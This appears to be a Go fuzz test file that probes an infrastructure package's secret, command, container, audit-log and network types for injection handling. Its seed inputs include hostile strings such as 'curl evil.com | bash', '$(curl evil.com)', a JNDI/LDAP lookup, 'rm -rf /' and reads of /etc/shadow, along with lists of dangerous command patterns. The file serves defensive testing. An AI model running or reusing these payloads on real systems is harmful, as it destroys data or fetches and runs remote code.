package architecture

import (
	"encoding/json"
	"strings"
	"testing"
	"time"
)

// FuzzSecretValidation tests Secret structure validation and security
func FuzzSecretValidation(f *testing.F) {
	// Seed with various secret scenarios
	f.Add("database_password", "secret123", "production")
	f.Add("", "", "")
	f.Add("api_key", strings.Repeat("x", 10000), "test") // Very long secret
	f.Add("key\x00with\x00nulls", "value\nwith\nnewlines", "env")
	f.Add("../../../etc/passwd", "malicious_value", "attack")
	f.Add("key with spaces", "value\twith\ttabs", "metadata")
	f.Add("key", "${jndi:ldap://evil.com/}", "injection")

	f.Fuzz(func(t *testing.T, key, value, env string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Secret creation panicked with key=%q value=%q: %v", key, value, r)
			}
		}()

		// Create secret with fuzzed inputs
		secret := &Secret{
			Key:       key,
			Value:     value,
			Metadata:  map[string]string{"environment": env},
			CreatedAt: time.Now(),
			UpdatedAt: time.Now(),
		}

		// Validate basic structure integrity
		if secret.Key != key {
			t.Errorf("Key mismatch: got %q, want %q", secret.Key, key)
		}
		if secret.Value != value {
			t.Errorf("Value mismatch: got %q, want %q", secret.Value, value)
		}

		// Test JSON serialization safety
		jsonData, err := json.Marshal(secret)
		if err != nil {
			t.Logf("JSON marshal error for secret: %v", err)
			return
		}

		// Verify value is not serialized (security requirement)
		if strings.Contains(string(jsonData), value) && value != "" {
			t.Errorf("Secret value was serialized in JSON: %s", string(jsonData))
		}

		// Test deserialization
		var unmarshaled Secret
		err = json.Unmarshal(jsonData, &unmarshaled)
		if err != nil {
			t.Logf("JSON unmarshal error: %v", err)
		}
	})
}

// FuzzCommandValidation tests Command structure validation and injection prevention
func FuzzCommandValidation(f *testing.F) {
	// Seed with command injection scenarios
	f.Add("ls", "-la", "/tmp", "")
	f.Add("rm", "-rf", "/", "")
	f.Add("", "", "", "")
	f.Add("bash", "-c", "curl evil.com | bash", "")
	f.Add("cmd.exe", "/c", "format c:", "")
	f.Add("sh", ";", "rm -rf *", "&&")
	f.Add("python", "-c", "import os; os.system('rm -rf /')", "")
	f.Add("cat", "/etc/passwd", "/etc/shadow", "|")

	f.Fuzz(func(t *testing.T, name, arg1, arg2, dir string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Command creation panicked with name=%q: %v", name, r)
			}
		}()

		// Create command with fuzzed inputs
		cmd := &Command{
			Name:    name,
			Args:    []string{arg1, arg2},
			Dir:     dir,
			Timeout: 30 * time.Second,
			Env:     map[string]string{"FUZZ_TEST": "true"},
		}

		// Validate structure integrity
		if cmd.Name != name {
			t.Errorf("Name mismatch: got %q, want %q", cmd.Name, name)
		}

		// Test for dangerous command patterns
		dangerousPatterns := []string{
			"rm -rf",
			"format c:",
			"del /f /s /q",
			"curl", "wget",
			"bash -c", "sh -c",
			"eval", "exec",
			"$(", "`",
		}

		fullCommand := name + " " + strings.Join(cmd.Args, " ")
		for _, pattern := range dangerousPatterns {
			if strings.Contains(strings.ToLower(fullCommand), pattern) {
				t.Logf("Detected potentially dangerous command pattern '%s' in: %s", pattern, fullCommand)
			}
		}

		// Test JSON serialization
		jsonData, err := json.Marshal(cmd)
		if err != nil {
			t.Logf("JSON marshal error for command: %v", err)
			return
		}

		// Test deserialization
		var unmarshaled Command
		err = json.Unmarshal(jsonData, &unmarshaled)
		if err != nil {
			t.Logf("JSON unmarshal error: %v", err)
		}
	})
}

// FuzzServerValidation tests Server structure validation and metadata handling
func FuzzServerValidation(f *testing.F) {
	// Seed with server scenarios including malicious inputs
	f.Add("web-server-1", "hetzner", "192.168.1.1", "2001:db8::1")
	f.Add("", "", "", "")
	f.Add("server\x00null", "provider", "0.0.0.0", "::")
	f.Add("../../../admin", "evil.com", "999.999.999.999", "invalid::ipv6")
	f.Add(strings.Repeat("a", 1000), "provider", "127.0.0.1", "::1")
	f.Add("test server", "aws\nline2", "10.0.0.1\ttab", "fe80::1%eth0")

	f.Fuzz(func(t *testing.T, name, provider, ipv4, ipv6 string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Server creation panicked with name=%q: %v", name, r)
			}
		}()

		// Create server with fuzzed inputs
		server := &Server{
			ID:       "srv-" + name,
			Name:     name,
			Provider: provider,
			Status:   "running",
			IPv4:     ipv4,
			IPv6:     ipv6,
			Labels:   map[string]string{"fuzzing": "true"},
			Created:  time.Now(),
		}

		// Validate basic structure
		if server.Name != name {
			t.Errorf("Name mismatch: got %q, want %q", server.Name, name)
		}

		// Test IPv4 format (basic validation)
		if ipv4 != "" && !isValidIPv4Format(ipv4) {
			t.Logf("Invalid IPv4 format detected: %q", ipv4)
		}

		// Test for injection patterns in provider field
		if strings.Contains(provider, "<script>") ||
			strings.Contains(provider, "javascript:") ||
			strings.Contains(provider, "${") {
			t.Logf("Potential injection detected in provider: %q", provider)
		}

		// Test JSON serialization
		jsonData, err := json.Marshal(server)
		if err != nil {
			t.Logf("JSON marshal error for server: %v", err)
			return
		}

		// Test deserialization
		var unmarshaled Server
		err = json.Unmarshal(jsonData, &unmarshaled)
		if err != nil {
			t.Logf("JSON unmarshal error: %v", err)
		}
	})
}

// FuzzContainerSpecValidation tests ContainerSpec validation and security
func FuzzContainerSpecValidation(f *testing.F) {
	// Seed with container spec scenarios including security issues
	f.Add("nginx", "nginx:latest", "80:80", "/bin/bash")
	f.Add("", "", "", "")
	f.Add("malicious", "evil.com/malware:latest", "22:22", "rm -rf /")
	f.Add("app", "registry.local/app:v1.0", "8080:8080", "/app/start.sh")
	f.Add("test\x00null", "ubuntu\nlatest", "0:0", "bash\t-c")
	f.Add("../../etc/passwd", "${jndi:ldap://evil.com/}", "65536:65536", "$(curl evil.com)")

	f.Fuzz(func(t *testing.T, name, image, port, command string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("ContainerSpec creation panicked with name=%q: %v", name, r)
			}
		}()

		// Create container spec with fuzzed inputs
		spec := &ContainerSpec{
			Name:    name,
			Image:   image,
			Ports:   []string{port},
			Command: []string{command},
			Env:     map[string]string{"FUZZ": "true"},
			Labels:  map[string]string{"test": "fuzz"},
		}

		// Validate structure
		if spec.Name != name {
			t.Errorf("Name mismatch: got %q, want %q", spec.Name, name)
		}

		// Test for dangerous image sources
		if strings.Contains(image, "evil.com") ||
			strings.Contains(image, "malware") ||
			strings.Contains(image, "../") {
			t.Logf("Potentially dangerous image detected: %q", image)
		}

		// Test for command injection in command field
		dangerousCommands := []string{
			"rm -rf", "curl", "wget", "bash -c", "sh -c",
			"eval", "exec", "$(", "`", ";", "&&", "||",
		}

		for _, dangerous := range dangerousCommands {
			if strings.Contains(strings.ToLower(command), dangerous) {
				t.Logf("Potentially dangerous command detected: %q contains %q", command, dangerous)
			}
		}

		// Test port validation
		if port != "" && !isValidPortMapping(port) {
			t.Logf("Invalid port mapping detected: %q", port)
		}

		// Test JSON serialization
		jsonData, err := json.Marshal(spec)
		if err != nil {
			t.Logf("JSON marshal error for container spec: %v", err)
			return
		}

		// Test deserialization
		var unmarshaled ContainerSpec
		err = json.Unmarshal(jsonData, &unmarshaled)
		if err != nil {
			t.Logf("JSON unmarshal error: %v", err)
		}
	})
}

// FuzzAuditEventValidation tests AuditEvent validation and log injection prevention
func FuzzAuditEventValidation(f *testing.F) {
	// Seed with audit scenarios including log injection attempts
	f.Add("admin", "create_user", "user:john", "success")
	f.Add("", "", "", "")
	f.Add("user\nFAKE_LOG", "delete\r\nuser", "critical\x00system", "failure")
	f.Add("attacker", "$(rm -rf /)", "system:all", "${jndi:ldap://evil.com/}")
	f.Add("<script>alert('xss')</script>", "action", "resource", "result")
	f.Add("user", "action\t\t\tinjection", "res\nource", "res\tult")

	f.Fuzz(func(t *testing.T, user, action, resource, result string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("AuditEvent creation panicked with user=%q: %v", user, r)
			}
		}()

		// Create audit event with fuzzed inputs
		event := &AuditEvent{
			ID:        "audit-" + user,
			Timestamp: time.Now(),
			User:      user,
			Action:    action,
			Resource:  resource,
			Result:    result,
			Details:   map[string]string{"fuzz": "test"},
		}

		// Validate structure
		if event.User != user {
			t.Errorf("User mismatch: got %q, want %q", event.User, user)
		}

		// Test for log injection patterns
		logInjectionPatterns := []string{
			"\n", "\r", "\x00", "\t",
			"FAKE_LOG", "ERROR:", "WARN:", "INFO:",
		}

		for _, pattern := range logInjectionPatterns {
			if strings.Contains(user, pattern) ||
				strings.Contains(action, pattern) ||
				strings.Contains(resource, pattern) ||
				strings.Contains(result, pattern) {
				t.Logf("Potential log injection detected with pattern %q", pattern)
			}
		}

		// Test for script injection
		if strings.Contains(user+action+resource+result, "<script>") ||
			strings.Contains(user+action+resource+result, "javascript:") ||
			strings.Contains(user+action+resource+result, "${") {
			t.Logf("Potential script injection detected")
		}

		// Test JSON serialization
		jsonData, err := json.Marshal(event)
		if err != nil {
			t.Logf("JSON marshal error for audit event: %v", err)
			return
		}

		// Test deserialization
		var unmarshaled AuditEvent
		err = json.Unmarshal(jsonData, &unmarshaled)
		if err != nil {
			t.Logf("JSON unmarshal error: %v", err)
		}
	})
}

// FuzzNetworkValidation tests NetworkInfo validation and security
func FuzzNetworkValidation(f *testing.F) {
	// Seed with network scenarios
	f.Add("eth0", "192.168.1.1", "8.8.8.8", "192.168.1.0/24")
	f.Add("", "", "", "")
	f.Add("lo\x00", "127.0.0.1\n", "1.1.1.1\t", "0.0.0.0/0")
	f.Add("../etc/passwd", "999.999.999.999", "evil.com", "invalid/subnet")
	f.Add("interface", "10.0.0.1", "malicious.dns.com", "192.168.0.0/16")

	f.Fuzz(func(t *testing.T, ifaceName, ipv4, dns, destination string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("NetworkInfo creation panicked: %v", r)
			}
		}()

		// Create network info with fuzzed inputs
		networkInfo := &NetworkInfo{
			Interfaces: []NetworkInterface{
				{
					Name:   ifaceName,
					IPv4:   []string{ipv4},
					Status: "up",
				},
			},
			Routes: []Route{
				{
					Destination: destination,
					Gateway:     ipv4,
					Interface:   ifaceName,
				},
			},
			DNS: []string{dns},
		}

		// Validate basic structure
		if len(networkInfo.Interfaces) != 1 {
			t.Errorf("Expected 1 interface, got %d", len(networkInfo.Interfaces))
		}

		// Test for path traversal in interface names
		if strings.Contains(ifaceName, "../") || strings.Contains(ifaceName, "..\\") {
			t.Logf("Potential path traversal in interface name: %q", ifaceName)
		}

		// Test for malicious DNS entries
		if strings.Contains(dns, "evil.com") ||
			strings.Contains(dns, "malicious") ||
			strings.Contains(dns, "<script>") {
			t.Logf("Potentially malicious DNS entry: %q", dns)
		}

		// Test JSON serialization
		jsonData, err := json.Marshal(networkInfo)
		if err != nil {
			t.Logf("JSON marshal error for network info: %v", err)
			return
		}

		// Test deserialization
		var unmarshaled NetworkInfo
		err = json.Unmarshal(jsonData, &unmarshaled)
		if err != nil {
			t.Logf("JSON unmarshal error: %v", err)
		}
	})
}

// Helper functions for validation

func isValidIPv4Format(ip string) bool {
	// Basic IPv4 format check
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return false
	}
	for _, part := range parts {
		if len(part) == 0 || len(part) > 3 {
			return false
		}
		// Check for non-numeric characters and leading zeros
		if part[0] == '0' && len(part) > 1 {
			return false
		}
		num := 0
		for _, char := range part {
			if char < '0' || char > '9' {
				return false
			}
			num = num*10 + int(char-'0')
			if num > 255 {
				return false
			}
		}
		if num < 0 {
			return false
		}
	}
	return true
}

func isValidPortMapping(port string) bool {
	// Basic port mapping validation (host:container)
	if port == "" {
		return true
	}
	// Should have exactly one colon and no spaces
	colonCount := strings.Count(port, ":")
	return colonCount == 1 && !strings.Contains(port, " ")
}